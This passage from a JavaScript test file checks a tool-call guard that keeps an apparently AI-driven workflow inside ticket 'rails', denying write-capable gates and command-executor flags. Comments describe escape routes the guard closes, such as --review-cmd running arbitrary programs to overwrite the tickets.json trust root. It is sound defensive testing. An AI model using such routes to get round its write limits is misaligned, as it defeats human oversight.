});

test('q: read-only gates still flow under rails; everything unrestricted with rails OFF', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    for (const gate of ['spec-lint', 'coldstart', 'preflight', 'merge-forecast']) {
      assert.equal(checkToolCall({ tool: 'adlc_gate', args: { gate, args: ['--json'] }, root: dir, env }).decision, 'allow', gate);
    }
    // rails not in force (no active ticket) → even hollow-test is allowed through
    const off = checkToolCall({ tool: 'adlc_gate', args: { gate: 'hollow-test', args: ['--test-cmd', 'x'] }, root: dir, env: { ...ON } });
    assert.equal(off.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (r) round-3 re-review: the allowlist itself must reflect true read-only behavior ----
test('r: review-calibration via adlc_gate under rails → deny (mutate/restore writer, same class as hollow-test)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'review-calibration', args: ['--commit', 'HEAD'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /derives or defaults its write targets/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: --record-verdict writes the manifest ledger — denied when the ledger is railed, allowed otherwise', () => {
  const railedLedger = repo({ tickets: { tickets: [{ id: 'T1', rails: ['.adlc/**'] }] } });
  const normalRails = repo({ tickets: T1_RAILED }); // rails: test/**
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    for (const gate of ['coldstart', 'premortem', 'parallax']) {
      const denied = checkToolCall({ tool: 'adlc_gate', args: { gate, args: ['--prompt-only', '--record-verdict', '-'] }, root: railedLedger, env });
      assert.equal(denied.decision, 'deny', `${gate} vs railed ledger`);
      assert.match(denied.reason, /manifest\.jsonl/);
      const allowed = checkToolCall({ tool: 'adlc_gate', args: { gate, args: ['--prompt-only', '--record-verdict', '-'] }, root: normalRails, env });
      assert.equal(allowed.decision, 'allow', `${gate} with non-railed ledger`);
    }
  } finally {
    rmSync(railedLedger, { recursive: true, force: true });
    rmSync(normalRails, { recursive: true, force: true });
  }
});

test('r: model-ratchet --review-cmd is an ARBITRARY PROGRAM — denied under rails; plain dry-run allowed', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // round-4 HIGH: the command can write ANY path, including the tickets.json
    // trust root — no ledger vet can catch it, so the flag class is denied.
    for (const argv of [['--review-cmd=true'], ['--review-cmd', 'node -e "hostile"']]) {
      const denied = checkToolCall({ tool: 'adlc_gate', args: { gate: 'model-ratchet', args: argv }, root: dir, env });
      assert.equal(denied.decision, 'deny', argv.join(' '));
      assert.match(denied.reason, /command-executor/);
    }
    const dryRun = checkToolCall({ tool: 'adlc_gate', args: { gate: 'model-ratchet', args: ['--dry-run'] }, root: dir, env });
    assert.equal(dryRun.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: command-executor flags are denied for EVERY gate under rails (class, not instance)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'spec-lint', args: ['--test-cmd', 'true'] }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /command-executor/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r: preflight scratch probes are vetted — denied only when a probe path is railed', () => {
  const railedAdlc = repo({ tickets: { tickets: [{ id: 'T1', rails: ['.adlc/**'] }] } });
  const railedGit = repo({ tickets: { tickets: [{ id: 'T1', rails: ['.git/**'] }] } }); // round-5: branch/worktree metadata churn
  const normalRails = repo({ tickets: T1_RAILED }); // rails: test/**
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    for (const dir of [railedAdlc, railedGit]) {
      const denied = checkToolCall({ tool: 'adlc_gate', args: { gate: 'preflight', args: [] }, root: dir, env });
      assert.equal(denied.decision, 'deny');
      assert.match(denied.reason, /preflight-test/);
    }
    const allowed = checkToolCall({ tool: 'adlc_gate', args: { gate: 'preflight', args: [] }, root: normalRails, env });
    assert.equal(allowed.decision, 'allow');
  } finally {
    rmSync(railedAdlc, { recursive: true, force: true });
    rmSync(railedGit, { recursive: true, force: true });
    rmSync(normalRails, { recursive: true, force: true });
  }
});
